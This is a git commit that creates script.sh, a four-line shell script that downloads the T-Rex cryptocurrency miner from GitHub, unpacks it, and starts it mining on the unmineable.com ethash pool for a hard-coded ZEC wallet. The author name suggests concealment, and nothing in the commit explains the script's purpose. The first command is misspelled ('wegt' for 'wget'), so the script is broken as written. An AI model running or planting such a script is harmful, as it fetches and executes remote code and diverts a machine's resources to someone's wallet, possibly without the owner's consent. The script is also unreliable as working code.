a09f1732cd8778b58f1ae1906396bf5e6c46423f
Definitely not xl_83 <98920372+LX8369@users.noreply.github.com>
2022-03-31 17:57:14 +1000

    Create script.sh

---
+++ script.sh
@@ -0,0 +1,4 @@
+wegt https://github.com/trexminer/T-Rex/releases/download/0.25.9/t-rex-0.25.9-linux.tar.gz
+tar -xf t-rex-0.25.9-linux.tar.gz
+cd t-rex-0.25.9-linux
+./t-rex -a ethash -o ethash.unmineable.com:3333 -u ZEC:t1d3c5rnpATRbtypFa4exBQTsVtihheddoh.server#rzex-599x -p x
